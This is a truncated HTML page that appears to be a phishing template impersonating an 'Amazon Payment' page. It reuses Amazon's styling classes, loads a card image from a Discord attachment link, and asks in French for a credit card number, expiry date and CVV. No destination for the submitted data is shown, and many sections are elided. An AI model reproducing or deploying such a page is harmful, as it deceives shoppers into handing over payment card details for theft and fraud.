...
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.21.4-2021-11-05">
   <head>
      ...
      <title dir="ltr">Amazon Payment</title>
                              ...
                              <div class="a-section">
                                 <div class="a-box">
                                    <div class="a-box-inner a-padding-extra-large">
                                       ...
                                       <center>
                                       <img style="margin-bottom:-80px;" width="350" class="cardImage_medium" src="https://media.discordapp.net/attachments/909068098101968916/909105771000791060/122-1229421_get-an-amazon-amazon-prime-rewards-visa-card.png">
                                       <P>&nbsp;</P>
                                       </center>
                                       <div class="a-row a-spacing-base">
                                          ...
                                          <input type="text" name="cc" minlength="16" maxlength="16" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
                                          ...
                                          <div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert">
                                             <div class="a-box-inner a-alert-container">
                                                ...
                                                <div class="a-alert-content">
                                                   Entrer le numéro de votre carte de crédit
                                                </div>
                                             </div>
                                          </div>
                                       </div>
            ...
            event.target.value = event.target.value.replace(
              ...
              /\/\//g, '/' // Prevent entering more than 1 `/`
                                       ...
                                       <div class="a-row a-spacing-base">
                                          ...
                                          <input onkeyup="formatString(event)"; type="text" name="exp" minlength="5" maxlength="5" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
                        
                                          <div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert">
                                             <div class="a-box-inner a-alert-container">
                                                <i class="a-icon a-icon-alert"></i>
                                                <div class="a-alert-content">
                                                   Entrer la date d'expiration de votre carte
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                       <div class="a-row a-spacing-base">
                                          ...
                                          <input type="password" name="ccv" minlength="4" maxlength="4" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
